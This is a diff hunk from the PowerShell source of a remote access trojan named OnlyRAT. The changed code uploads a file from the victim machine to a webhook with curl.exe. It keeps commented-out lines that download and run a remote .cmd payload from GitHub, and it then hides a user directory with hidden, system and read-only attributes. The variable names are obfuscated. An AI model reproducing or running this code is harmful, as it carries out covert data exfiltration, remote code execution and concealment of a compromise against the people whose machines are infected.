@@ -51,8 +51,10 @@ Add-Content -Path $CRYnrkaDbe -Value 'local' # connection type
 
 # send file to webhook
 $PEBgxuJUfd = Get-Content lawFvVTikZ.txt | Out-String
-Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/send-to-webhook.cmd -OutFile "$VquGXMYQWi.cmd"
-Invoke-Expression "./$VquGXMYQWi.cmd $PEBgxuJUfd"
+curl.exe -F "payload_json={\`"username\`": \`"OnlyRAT\`", \`"content\`": \`"download me\`"}" -F "file=@$CRYnrkaDbe" $PEBgxuJUfd
+
+# Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/send-to-webhook.cmd -OutFile "$VquGXMYQWi.cmd"
+# Invoke-Expression "./$VquGXMYQWi.cmd $PEBgxuJUfd"
 
 # cleanup
 attrib +h +s +r C:/Users/onlyrat 
